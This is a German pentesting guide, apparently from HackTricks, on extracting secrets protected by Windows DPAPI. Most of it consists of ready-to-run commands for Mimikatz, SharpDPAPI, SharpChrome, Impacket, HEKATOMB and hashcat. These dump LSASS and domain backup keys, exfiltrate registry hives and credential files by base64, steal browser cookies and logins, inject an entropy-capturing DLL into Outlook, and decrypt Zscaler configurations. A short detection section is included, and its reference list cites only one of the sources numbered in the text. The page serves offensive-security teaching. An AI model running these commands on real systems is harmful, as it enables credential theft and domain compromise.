# DPAPI - Passwörter extrahieren

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI?

Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet. Dabei dienen Benutzer- oder Systemgeheimnisse als wichtige Entropiequelle. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler: Sie können Daten mit einem Schlüssel verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers oder bei der Systemverschlüsselung aus den Domänenauthentifizierungsgeheimnissen des Systems abgeleitet wird. Dadurch müssen Entwickler den Schutz des Verschlüsselungsschlüssels nicht selbst verwalten.

DPAPI wird am häufigsten über die Funktionen **`CryptProtectData` und `CryptUnprotectData`** verwendet. Mit ihnen können Anwendungen Daten im Sicherheitskontext des aktuell angemeldeten Prozesses verschlüsseln und entschlüsseln. Standardmäßig können die Daten nur von demselben Benutzer- oder Systemkontext entschlüsselt werden, der sie verschlüsselt hat.<sup>[[2]](#references)[[3]](#references)</sup>

Diese Funktionen akzeptieren außerdem einen optionalen **Entropy-Parameter**, der bei der Verschlüsselung und Entschlüsselung verwendet wird. Mit optionaler Entropie geschützte Daten erfordern bei der Entschlüsselung denselben Entropiewert.<sup>[[2]](#references)[[6]](#references)</sup>

### Schlüsselgenerierung für Benutzer

DPAPI leitet aus den Anmeldeinformationen des Benutzers einen benutzerspezifischen Wert ab, der oft **pre-key** genannt wird. Die genaue Ableitung hängt vom Konto und der Betriebssystemversion ab. Impacket verwendet beispielsweise einen HMAC-SHA1-Pfad, der auf dem SHA-1-Digest des UTF-16LE-Passworts basiert, einen weiteren Pfad auf Grundlage des MD4-/NT-Hashes des Passworts sowie einen von PBKDF2-SHA256 abgeleiteten Pfad für Protected Users. Deshalb können Offline-Tools das benötigte Material häufig sowohl aus dem Klartextpasswort als auch aus einem verfügbaren NT-Hash ableiten.<sup>[[2]](#references)[[10]](#references)</sup>

Das ist besonders interessant, denn wenn ein Angreifer den Passwort-Hash eines Benutzers erlangen kann, kann er:

- **Alle mit DPAPI verschlüsselten Daten** mit dem Schlüssel dieses Benutzers entschlüsseln, ohne eine API kontaktieren zu müssen
- Versuchen, das **Passwort offline zu cracken**, um den gültigen DPAPI-Schlüssel zu erzeugen

DPAPI verwaltet für jeden Benutzer einen oder mehrere **Master-Schlüssel**, statt für jedes geschützte Blob einen neuen Master-Schlüssel zu erstellen. Jeder Master-Schlüssel hat eine **GUID** (Globally Unique Identifier), und ein verschlüsseltes Blob gibt an, welcher Master-Schlüssel es schützt.<sup>[[2]](#references)</sup>

Master-Schlüssel werden im Verzeichnis **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gespeichert, wobei `{SID}` für den Security Identifier des Benutzers steht. Die Master-Schlüsseldatei enthält Material, das durch den **pre-key** des Benutzers geschützt ist, sowie bei Domänenbenutzern Wiederherstellungsmaterial, das durch einen **domain backup key** geschützt ist.<sup>[[2]](#references)</sup>

Beachte, dass der **Domänenschlüssel, der zum Verschlüsseln des Master-Schlüssels verwendet wird, auf den Domänencontrollern gespeichert ist und sich nie ändert**. Wenn ein Angreifer also Zugriff auf den Domänencontroller hat, kann er den domain backup key abrufen und die Master-Schlüssel aller Benutzer in der Domäne entschlüsseln.<sup>[[2]](#references)</sup>

Die verschlüsselten Blobs enthalten in ihren Headern die **GUID des Master-Schlüssels**, mit dem die darin enthaltenen Daten verschlüsselt wurden.

> [!TIP]
> DPAPI-verschlüsselte Blobs beginnen mit **`01 00 00 00`**

Master-Schlüssel finden:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

So sehen mehrere Master Keys eines Benutzers aus:

![Was ist DPAPI – Schlüsselgenerierung für Benutzer: So sehen mehrere Master Keys eines Benutzers aus](<../../images/image (1121).png>)

### Generierung von Maschinen-/Systemschlüsseln

Dieser Schlüssel wird von der Maschine zum Verschlüsseln von Daten verwendet. Er basiert auf dem **DPAPI_SYSTEM-LSA-Secret**, einem speziellen Schlüssel, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Schlüssel wird zum Verschlüsseln von Daten verwendet, auf die das System selbst zugreifen muss, beispielsweise Anmeldedaten auf Maschinenebene oder systemweite Secrets.<sup>[[2]](#references)</sup>

Beachte, dass diese Schlüssel **kein Domain-Backup haben** und daher nur lokal zugänglich sind:

- **Mimikatz** kann darauf zugreifen, indem es mit dem Befehl `mimikatz lsadump::secrets` LSA-Secrets ausliest.
- Das Secret ist in der Registry gespeichert, daher könnte ein Administrator **die DACL-Berechtigungen ändern, um darauf zuzugreifen**. Der Registry-Pfad lautet: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Auch eine Offline-Extraktion aus Registry-Hives ist möglich. Ein Administrator auf dem Zielsystem kann beispielsweise die Hives speichern und exfiltrieren:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Führe dann auf deiner Analyse-Box das DPAPI_SYSTEM-LSA-Secret aus den Hives aus und verwende es, um DPAPI-Blobs im Maschinenbereich zu entschlüsseln (z. B. maschinengeschützte Anmeldedaten von Anwendungen oder WLAN-Profile):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam-spezifisches DPAPI-Beispiel:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Durch DPAPI geschützte Daten

Zu den durch DPAPI geschützten personenbezogenen Daten gehören:

- Windows-Anmeldedaten
- Passwörter und AutoVervollständigungsdaten von Internet Explorer und Google Chrome
- Passwörter für E-Mail- und interne FTP-Konten in Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüsseln
- Passwörter für Remotedesktopverbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, sowie personenbezogene Daten in Anwendungen, die CryptProtectData verwenden, z. B. Skype, MSN Messenger und andere
- Verschlüsselte Blobs in der Registrierung
- ...

Zu den systemgeschützten Daten gehören:
- WLAN-Passwörter
- ...

Passwörter für geplante Aufgaben sind ein separates LSA-Secret-Thema. Eine Aufgabe, die mit dem [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) registriert wurde, kann ein Passwort für die Wiederherstellung des lokalen Administratorkontos oder von SYSTEM speichern; bei einer S4U- oder interaktiven Token-Aufgabe ist dagegen nicht gewährleistet, dass ein Passwort gespeichert wurde. Der Principal und der Anmeldetyp einer Aufgabe sind aussagekräftigere Indikatoren als allein der angegebene Ausführungskontename.

### Optionen zum Extrahieren von Master Keys

- Wenn ein Benutzer über Domänenadministratorrechte verfügt, kann er auf den **Domänen-Backup-Schlüssel** zugreifen, um alle Benutzer-Master-Keys in der Domäne zu entschlüsseln:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Mit lokalen Administratorrechten ist es möglich, **auf den LSASS-Speicher zuzugreifen**, um die DPAPI-Masterschlüssel aller angemeldeten Benutzer sowie den SYSTEM-Schlüssel zu extrahieren.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Wenn der Benutzer über lokale Administratorrechte verfügt, kann er auf das **DPAPI_SYSTEM LSA secret** zugreifen, um die Master Keys des Computers zu entschlüsseln:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, können die **Master Keys des Benutzers direkt entschlüsselt werden**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Wenn du dich in einer Sitzung als Benutzer befindest, kannst du den DC per **RPC nach dem Backup-Schlüssel zum Entschlüsseln der Masterkeys fragen**. Wenn du lokaler Administrator bist und der Benutzer angemeldet ist, kannst du auch **sein Sitzungstoken stehlen**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault auflisten

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Zugriff auf DPAPI-verschlüsselte Daten

### DPAPI-verschlüsselte Daten finden

Häufig geschützte Dateien von Benutzern befinden sich unter:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Prüfen Sie auch die obigen Pfade, indem Sie `\Roaming\` durch `\Local\` ersetzen.

Beispiele zur Enumeration:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registrierung und in B64-Blobs finden:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Beachte, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repo) verwendet werden kann, um sensible Daten wie Cookies mit DPAPI zu entschlüsseln.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron-Schnellrezepte (SharpChrome)

- Aktueller Benutzer, interaktive Entschlüsselung gespeicherter Logins/Cookies (funktioniert auch mit app-bound Cookies ab Chrome 127, da der zusätzliche Schlüssel bei Ausführung im Benutzerkontext aus dem Credential Manager des Benutzers abgerufen wird):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Offline-Analyse, wenn du nur Dateien hast. Extrahiere zuerst den AES-State-Key aus der „Local State“-Datei des Profils und verwende ihn dann, um die Cookie-Datenbank zu entschlüsseln:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Domänenweite/remote Triage, wenn du den DPAPI-Domänen-Backup-Schlüssel (PVK) und Admin-Rechte auf dem Zielhost hast:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Wenn du den DPAPI prekey/credkey eines Benutzers (aus LSASS) hast, kannst du das Knacken des Passworts überspringen und Profildaten direkt entschlüsseln:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Hinweise
- Neuere Chrome-/Edge-Builds speichern bestimmte Cookies möglicherweise mit „App-Bound“-Verschlüsselung. Diese spezifischen Cookies lassen sich offline ohne den zusätzlichen app-bound key nicht entschlüsseln. Führe SharpChrome im Kontext des Zielbenutzers aus, um ihn automatisch abzurufen. Siehe den unten referenzierten Chrome-Sicherheitsblogbeitrag.<sup>[[5]](#references)</sup>

### Zugriffsschlüssel und Daten

- **Verwende SharpDPAPI**, um Anmeldedaten aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung abzurufen:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Informationen zu Anmeldedaten abrufen** wie die verschlüsselten Daten und den guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Auf Masterkeys zugreifen**:

Einen Masterkey eines Benutzers entschlüsseln und dabei den **domain backup key** über RPC anfordern:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Das Tool **SharpDPAPI** unterstützt auch die folgenden Argumente zur Entschlüsselung von Masterkeys (beachte, dass du `/rpc` verwenden kannst, um den Backup Key der Domäne abzurufen, `/password`, um ein Klartextpasswort zu verwenden, oder `/pvk`, um eine private DPAPI-Domänenschlüsseldatei anzugeben ...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Daten mithilfe eines Masterkeys entschlüsseln**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Das **SharpDPAPI**-Tool unterstützt diese Argumente auch für die Entschlüsselung von `credentials|vaults|rdg|keepass|triage|blob|ps` (beachte, dass `/rpc` verwendet werden kann, um den Domänen-Backup-Schlüssel abzurufen, `/password` für ein Klartextpasswort, `/pvk` zum Angeben einer DPAPI-Domänen-Private-Key-Datei und `/unprotect` zur Verwendung der Sitzung des aktuellen Benutzers ...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Einen DPAPI prekey/credkey direkt verwenden (kein Passwort erforderlich)

Wenn du LSASS dumpen kannst, zeigt Mimikatz oft einen DPAPI-Schlüssel pro Logon an, mit dem sich die Masterkeys des Benutzers ohne Kenntnis des Klartextpassworts entschlüsseln lassen. Übergib diesen Wert direkt an das Tooling:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Einige Daten mithilfe der **Sitzung des aktuellen Benutzers** entschlüsseln:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Offline decryption with Impacket dpapi.py

Wenn du die SID und das Passwort (oder den NT-Hash) des Opfers hast, kannst du DPAPI-Masterkeys und Credential-Manager-Blobs vollständig offline mit Impackets dpapi.py entschlüsseln.<sup>[[10]](#references)[[11]](#references)</sup>

- Artefakte auf der Festplatte identifizieren:
  - Credential-Manager-Blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - Passender Masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Wenn die Dateiübertragungstools unzuverlässig sind, kodiere die Dateien auf dem Host mit base64 und kopiere die Ausgabe:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Entschlüssle den masterkey mit der SID und dem Passwort/Hash des Benutzers:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Verwenden Sie den entschlüsselten Masterkey, um den Credential-Blob zu entschlüsseln:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Dieser Workflow stellt häufig Domänenanmeldedaten wieder her, die von Apps mithilfe des Windows Credential Manager gespeichert wurden, darunter auch Administratorkonten (z. B. `*_adm`).

---

### Umgang mit optionaler Entropie („Entropie von Drittanbietern“)

Einige Anwendungen übergeben einen zusätzlichen Wert für die **Entropie** an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der richtige Masterkey bekannt ist. Die Entropie zu ermitteln, ist daher unerlässlich, wenn Anmeldedaten angegriffen werden, die auf diese Weise geschützt sind (z. B. bei Microsoft Outlook und einigen VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine DLL im Benutzermodus, die die DPAPI-Funktionen im Zielprozess hookt und jede übergebene optionale Entropie transparent aufzeichnet. Wird EntropyCapture im **DLL-injection**-Modus auf Prozesse wie `outlook.exe` oder `vpnclient.exe` angewendet, gibt es eine Datei aus, die jeden Entropiepuffer dem aufrufenden Prozess und Blob zuordnet. Die erfasste Entropie kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Offline-Cracking von Masterkeys (Hashcat & DPAPISnoop)

Microsoft führte ab Windows 10 v1607 (2016) ein **Kontext-3**-Masterkey-Format ein. `hashcat` v6.2.6 (Dezember 2023) fügte die Hash-Modi **22100** (DPAPI-Masterkey v1, Kontext ), **22101** (Kontext 1) und **22102** (Kontext 3) hinzu. Damit lassen sich Benutzerpasswörter direkt aus der Masterkey-Datei GPU-beschleunigt cracken. Angreifer können daher Wörterbuch- oder Brute-Force-Angriffe ausführen, ohne mit dem Zielsystem zu interagieren.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatisiert den Prozess:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Das Tool kann außerdem Credential- und Vault-Blobs parsen, sie mit geknackten Schlüsseln entschlüsseln und Klartextpasswörter exportieren.<sup>[[8]](#references)</sup>


### Auf Daten anderer Computer zugreifen

In **SharpDPAPI und SharpChrome** kannst du die Option **`/server:HOST`** angeben, um auf die Daten eines Remote-Computers zuzugreifen. Natürlich musst du auf diesen Computer zugreifen können. Im folgenden Beispiel wird angenommen, dass der **Domain-Backup-Verschlüsselungsschlüssel bekannt ist**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

### Verbindung zur Report-Server-Datenbank von SSRS

Auf einem Host mit SQL Server Reporting Services (SSRS) kann `RSReportServer.config` einen verschlüsselten `<Dsn>` für die Report-Server-Datenbank enthalten.<sup>[[15]](#references)</sup> SSRS schützt diese Verbindungseinstellungen mit einem **lokalen Schlüssel auf Maschinenebene**; Anmeldedaten für externe Report-Datenquellen werden stattdessen mit dem symmetrischen Schlüssel in der Report-Server-Datenbank verschlüsselt.<sup>[[14]](#references)</sup>

Im geschilderten Fall extrahierte der Angreifer den `Dsn` und versuchte, dessen Base64-decodierte Bytes mit `ProtectedData.Unprotect` und dem Gültigkeitsbereich `LocalMachine` zu entschlüsseln.<sup>[[13]](#references)</sup>

Mit Lesezugriff auf die SSRS-Konfigurationsdatei auf dem Rechner, der sie geschützt hat, lässt sich der tatsächliche Instanzpfad ermitteln und der Wert untersuchen. Der Beispielpfad gilt für SSRS 2017 und später; der Schutz auf Maschinenebene erfordert nicht den Kontext des SSRS-Dienstkontos.<sup>[[14]](#references)[[15]](#references)</sup>

```powershell
$path = 'C:\Program Files\Microsoft SQL Server Reporting Services\SSRS\ReportServer\rsreportserver.config'
$config = Get-Content $path -Raw
$b64 = [regex]::Match($config, '<Dsn>([^<]+)</Dsn>').Groups[1].Value
$blob = [Convert]::FromBase64String($b64)
$plain = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'LocalMachine')
[Text.Encoding]::UTF8.GetString($plain)
```

Ein leeres oder fehlendes `Dsn` liefert dieser Methode nichts zum Entschlüsseln.<sup>[[15]](#references)</sup> Eine entschlüsselte Verbindungszeichenfolge enthält **nicht unbedingt** ein wiederverwendbares Passwort: SSRS kann sein Dienstkonto verwenden, oder für ein konfiguriertes Domänenkonto können separate Einstellungen für `LogonUser`, `LogonDomain` und `LogonCred` gelten.<sup>[[15]](#references)</sup> Das Kopieren des verschlüsselten Werts auf einen anderen Rechner gibt diesem nicht den Schutzschlüssel des ursprünglichen Hosts.<sup>[[14]](#references)</sup>

Weitere Zugriffswege auf SQL Server findest du unter [MSSQL pentesting](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/).

## Weitere Tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des Backup-Schlüssels des Domain Controllers über RPC automatisiert. Das Skript ermittelt anschließend die IP-Adressen aller Computer und führt auf allen Computern einen smbclient aus, um alle DPAPI-Blobs aller Benutzer abzurufen und mit dem Domänen-Backup-Schlüssel zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus LDAP extrahierten Computerliste kannst du jedes Subnetz finden, auch wenn du sie vorher nicht kanntest!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann durch DPAPI geschützte Secrets automatisch dumpen. Die Version 2.x führte Folgendes ein:<sup>[[9]](#references)</sup>

* Paralleles Sammeln von Blobs auf Hunderten Hosts
* Parsing von Masterkeys mit **context 3** und automatische Hashcat-Cracking-Integration
* Unterstützung für verschlüsselte Chrome-„App-Bound“-Cookies (siehe nächsten Abschnitt)
* Einen neuen **`--snapshot`**-Modus, der Endpoints wiederholt abfragt und neu erstellte Blobs vergleicht 

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für Masterkey-, Credential- und Vault-Dateien, der Formate für Hashcat/JtR ausgeben und optional automatisch Cracking ausführen kann. Das Tool unterstützt vollständig die Masterkey-Formate für Computer und Benutzer bis einschließlich Windows 11 24H1.<sup>[[8]](#references)</sup>


## Häufige Erkennungsmerkmale

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
    - Besonders über eine Netzwerkfreigabe wie **C$** oder **ADMIN$**.
- Verwendung von **Mimikatz**, **SharpDPAPI** oder ähnlichen Tools, um auf den LSASS-Speicher zuzugreifen oder Masterkeys zu dumpen.
- Ereignis **4662**: *An object operation was performed* – kann mit dem Zugriff auf das Objekt **`BCKUPKEY`** korreliert werden.
- Ereignis **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* anfordert (Credential Manager)

---
### Sicherheitslücken und Änderungen im Ökosystem 2023–2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugriff konnte ein Domänenmitglied dazu bringen, einen bösartigen DPAPI-Backup-Schlüssel abzurufen, wodurch sich Benutzer-Masterkeys entschlüsseln ließen. Das Problem wurde mit dem kumulativen Update vom November 2023 behoben – Administratoren sollten sicherstellen, dass DCs und Workstations vollständig gepatcht sind.<sup>[[4]](#references)</sup>
* **Chrome 127 „App-Bound“-Cookie-Verschlüsselung** (Juli 2024) ersetzte den bisherigen reinen DPAPI-Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert wird. Für die Offline-Entschlüsselung von Cookies werden nun sowohl der DPAPI-Masterkey als auch der **GCM-umhüllte App-Bound-Schlüssel** benötigt. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel abrufen, wenn sie im Benutzerkontext ausgeführt werden.<sup>[[5]](#references)</sup>


### Fallstudie: Zscaler Client Connector – benutzerdefinierte Entropie aus der SID abgeleitet

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei wird mit **DPAPI (Machine scope)** verschlüsselt, aber der Hersteller stellt **benutzerdefinierte Entropie** bereit, die *zur Laufzeit berechnet* und nicht auf dem Datenträger gespeichert wird.<sup>[[1]](#references)</sup>

Die Entropie wird aus zwei Elementen rekonstruiert:

1. Ein fest codiertes Secret in `ZSACredentialProvider.dll`.
2. Die **SID** des Windows-Kontos, zu dem die Konfiguration gehört.

Der von der DLL implementierte Algorithmus entspricht dem folgenden:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Da das Geheimnis in einer DLL eingebettet ist, die von der Festplatte gelesen werden kann, **kann jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID neu generieren** und die Blobs offline entschlüsseln:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Die Entschlüsselung liefert die vollständige JSON-Konfiguration, einschließlich sämtlicher **Geräte-Statusprüfungen** und der jeweils erwarteten Werte – Informationen, die bei Versuchen, clientseitige Bypässe durchzuführen, sehr wertvoll sind.

> TIPP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Null-Bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Berechtigungen erlangt wurden.

## References

- [1] [Synacktiv – Sollte man seinem Zero Trust vertrauen? Umgehung von Zscaler-Posture-Prüfungen](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
